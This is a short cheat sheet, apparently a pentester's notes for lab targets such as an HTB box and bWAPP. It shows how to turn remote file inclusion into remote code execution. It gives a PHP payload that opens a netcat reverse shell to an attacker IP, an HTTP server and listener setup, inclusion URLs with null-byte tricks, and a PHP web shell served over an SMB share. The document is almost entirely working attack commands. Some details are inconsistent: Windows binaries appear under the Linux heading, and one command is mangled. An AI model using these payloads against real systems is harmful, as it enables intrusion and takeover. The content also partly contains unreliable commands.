## Getting RCE (Linux) :

```sh
echo '<?php echo shell_exec("nc.exe 10.11.0.105 9090 -e cmd.exe") ?>' > evil.php
```

```python
python3 -m http.server 80
```

```bash
nc -nvlp 9090
```

Now access our shell from target website.
http://target.htb/addguestbook.php?parameter=http://<OUR_IP>/evil.php%00

- - -
## Getting RCE (Windows) :

```bash
echo "<?php echo shell_exec($_GET['cmd']);?>" > /tmp/php_cmd.php
```

```sh
sudo apt-get install samba
```

```python
python smbshare.py –smb2support sharepath /tmp
```

Now, Access it via browser (**2 request attack**):
http://192.168.0.3/bWAPP/rlfi.php?language=\\Our-IP\sharepath\php_cmd.php

And Now we have Command execution : 
http://192.168.0.3/bWAPP/rlfi.php?language=\\Our-IP\sharepath\php_cmd.php&cmd=dir

